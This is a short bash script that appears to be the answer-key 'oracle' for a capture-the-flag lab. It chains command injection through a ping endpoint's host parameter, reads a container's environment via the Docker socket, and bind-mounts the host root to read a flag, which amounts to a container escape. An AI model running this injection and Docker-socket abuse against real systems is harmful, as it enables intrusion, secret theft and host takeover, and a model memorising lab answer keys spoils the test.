#!/usr/bin/env bash
# Oracle: cmd injection -> flag1; docker socket -> inspect backup-job -> flag2;
# bind-mount the daemon host root -> flag3.
set -euo pipefail
B=http://status:8080
echo "== stage 1: command injection =="
curl -s "$B/ping?host=8.8.8.8;cat%20/home/www/flag1.txt" || true
echo; echo "== stage 2: docker env =="
curl -s "$B/ping?host=8.8.8.8;docker%20inspect%20backup-job" | grep -A3 '"Env"' || true
curl -s "$B/ping?host=8.8.8.8;docker%20inspect%20-f%20%27%7B%7B%2A%2EConfig.Env%7D%7D%27%20backup-job" || true
echo; echo "== stage 3: mount daemon host root =="
curl -s "$B/ping?host=8.8.8.8;docker%20run%20--rm%20-v%20/%3A/mnt%20alpine%3A3.20.6%20cat%20/mnt/root/flag3.txt" || true
echo
